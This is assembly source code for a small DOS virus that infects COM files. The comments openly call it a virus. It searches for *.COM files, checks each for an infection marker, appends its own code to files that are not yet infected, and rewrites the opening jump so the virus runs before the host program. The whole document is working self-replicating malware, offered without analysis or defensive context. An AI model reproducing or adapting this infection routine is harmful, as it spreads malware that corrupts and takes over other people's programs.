PAGE  59,132


data_2e         equ     1ABh                    ;start of virus

seg_a           segment byte public             ;
                assume  cs:seg_a, ds:seg_a      ;assume cs, ds - code


                org     100h                    ;orgin of all COM files
s               proc    far

start:
                jmp     loc_1                   ;jump to virus


;this is a replacement for an infected file

                db      0CDh, 20h, 7, 8, 9      ;int 20h
                                                ;pop es

loc_1:
                call    sub_1                   ;



s               endp


sub_1           proc    near                    ;
                pop     si                      ;locate all virus code via
                sub     si,10Bh                 ;si, cause all offsets will
                mov     bp,data_1[si]           ;change when virus infects
                add     bp,103h                 ;a COM file
                lea     dx,[si+1A2h]            ;offset of '*.COM',0 - via SI
                xor     cx,cx                   ;clear cx - find only normal
                                                ;attributes
                mov     ah,4Eh                  ;find first file
loc_2:
                int     21h                     ;

                jc      loc_6                   ;no files found? then quit
                mov     dx,9Eh                  ;offset of filename found
                mov     ax,3D02h                ;open file for read/write access
                int     21h                     ;

                mov     bx,ax                   ;save handle into bx
                mov     ah,3Fh                  ;read from file
                lea     dx,[si+1A8h]            ;offset of save buffer
                mov     di,dx                   ;
                mov     cx,3                    ;read three bytes
                int     21h                     ;
                
                cmp     byte ptr [di],0E9h      ;compare buffer to virus id
                                                ;string
                je      loc_4                   ;
loc_3:
                mov     ah,4Fh                  ;find the next file
                jmp     short loc_2             ;and test it
loc_4:
                mov     dx,[di+1]               ;lsh of offset
                mov     data_1[si],dx           ;
                xor     cx,cx                   ;msh of offset
                mov     ax,4200h                ;set the file pointer
                int     21h                     ;

                mov     dx,di                   ;buffer to save read
                mov     cx,2                    ;read two bytes
                mov     ah,3Fh                  ;read from file
                int     21h                     ;

                cmp     word ptr [di],807h      ;compare buffer to virus id
                je      loc_3                   ;same? then find another file

;heres where we infect a file

                xor     dx,dx                   ;set file pointer
                xor     cx,cx                   ;ditto
                mov     ax,4202h                ;set file pointer
                int     21h                     ;

                cmp     dx,0                    ;returns msh
                jne     loc_3                   ;not the same? find another file
                cmp     ah,0FEh                 ;lsh = 254???
                jae     loc_3                   ;if more or equal find another file

                mov     ds:data_2e[si],ax       ;point to data
                mov     ah,40h                  ;write to file
                lea     dx,[si+105h]            ;segment:offset of write buffer
                mov     cx,0A3h                 ;write 163 bytes
                int     21h                     ;

                jc      loc_5                   ;error? then quit
                mov     ax,4200h                ;set file pointer
                xor     cx,cx                   ;to the top of the file
                mov     dx,1                    ;
                int     21h                     ;

                mov     ah,40h                  ;write to file
                lea     dx,[si+1ABh]            ;offset of jump to virus code
                mov     cx,2                    ;two bytes
                int     21h                     ;

;now close the file

loc_5:
                mov     ah,3Eh                  ;close file
                int     21h                     ;

loc_6:
                jmp     bp                      ;jump to original file

data_1          dw      0                       ;
                db      '*.COM',0               ;wild card search string


sub_1           endp
seg_a           ends
                end     start
